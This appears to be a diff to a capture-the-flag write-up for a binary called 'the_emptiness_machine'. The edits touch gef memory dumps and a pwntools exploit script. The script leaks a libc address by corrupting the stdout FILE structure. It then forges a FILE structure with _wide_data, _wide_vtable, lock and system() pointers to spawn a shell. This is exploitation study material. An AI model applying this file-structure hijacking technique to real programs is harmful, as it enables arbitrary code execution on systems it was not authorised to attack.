@@ -387,10 +387,13 @@ $4 = (<data variable, no debug info> *) 0x7f0f352044e0 <_IO_2_1_stderr_>
 $5 = 0x164     // offset to _wide_vtable (and stderr)
 (remote) gef➤  p 0x164 + 0x10
 $7 = 0x174     // offset to _wide_data
-(remote) gef➤
+(remote) gef➤  x/10gx $leak
+0x7f0f35204644 <_IO_2_1_stdout_+132>:   0x6e20571000000000      0xffffffff00007f7d
+0x7f0f35204644 <_IO_2_1_stdout_+148>:   0x00000000ffffffff      0x6e2037e000000000
+0x7f0f35204644 <_IO_2_1_stdout_+164>:   0x0000000000007f7d      0x0000000000000000 // <-- can use this offset for _lock (40 0x28)
+0x7f0f35204644 <_IO_2_1_stdout_+180>:   0x0000000000000000      0xffffffff00000000
+0x7f0f35204644 <_IO_2_1_stdout_+196>:   0x0000000000000000      0x0000000000000000
 ```
-
-> And also offset for `_lock` - `address + 0xa0`
 
 And the final exploit script:
 
@@ -418,7 +421,7 @@ p = process('./the_emptiness_machine')
 
 # leaking address
 payload = p64(0xfbad1800) # magic + flag
-payload += p64(0)*3 # clear 3 read pointers; scanf() zero-terminator overwrites LSB of _IO_write_base
+payload += p64(0)*3 # zero 3 read address. scanf() will zero one byte of _IO_write_base
 
 p.readuntil(b'Rin\'s interaction: ')
 p.writeline(payload)
@@ -429,6 +432,7 @@ system = p64(u64(address) - SYSTEM_OFFSET)
 vtable = p64(u64(address) - VTABLE_OFFSET)
 wide_data = p64(u64(address) - WIDE_DATA_OFFSET)
 wide_vtable = p64(u64(address) - WIDE_VTABLE_OFFSET)
+lock = p64(u64(address) + 0x28)
 
 # constructing payload for code execution
 payload = b'e=1;sh\x00'.ljust(8, b'\x00') # 0
@@ -448,7 +452,7 @@ payload += system # 104
 payload += p64(0) # 112
 payload += b'\x00'*8 # 120
 payload += b'\x00'*8 # 128
-payload += p64(u64(address) + 0xa0) # 136
+payload += lock # 136
 payload += b'\x00'*8 # 144
 payload += b'\x00'*8 # 152
 payload += wide_data # 160
